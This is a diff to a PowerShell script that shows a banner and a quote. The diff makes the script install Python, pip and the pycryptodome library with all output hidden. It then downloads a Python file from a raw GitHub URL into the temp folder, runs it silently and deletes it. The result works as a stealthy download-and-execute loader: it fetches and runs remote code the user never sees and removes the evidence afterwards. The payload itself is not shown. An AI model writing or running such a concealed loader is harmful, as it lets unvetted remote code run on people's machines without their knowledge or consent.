@@ -35,23 +35,33 @@ function Show-Quote {
 Show-Banner
 Show-Quote
 
+# --- Ensure Python is installed ---
 if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
-    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
-    Start-Process "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-    Remove-Item "$env:TEMP\python-installer.exe"
+    $pythonInstaller = "$env:TEMP\python-installer.exe"
+    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile $pythonInstaller -UseBasicParsing | Out-Null
+    Start-Process $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
+    Remove-Item $pythonInstaller -Force
+
+    # Refresh PATH so current session can see python
+    $env:PATH = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 }
 
+# --- Ensure pip is installed ---
 if (-not (Get-Command pip -ErrorAction SilentlyContinue)) {
-    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\get-pip.py"
-    python "$env:TEMP\get-pip.py"
-    Remove-Item "$env:TEMP\get-pip.py"
+    $getPip = "$env:TEMP\get-pip.py"
+    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -UseBasicParsing | Out-Null
+    python $getPip *> $null
+    Remove-Item $getPip -Force
 }
 
-pip install pycryptodome
+# --- Install dependency silently ---
+python -m pip install --upgrade pip *> $null
+python -m pip install pycryptodome *> $null
 
-
+# --- Download + run your script silently ---
 $scriptUrl = "https://raw.githubusercontent.com/loopydevv-commits/loopysTestThing/main/main.py" 
 $scriptPath = "$env:TEMP\downloaded_script.py"
-Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
-python $scriptPath
-Remove-Item $scriptPath
+Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing | Out-Null
+python $scriptPath *> $null
+Remove-Item $scriptPath -Force
+
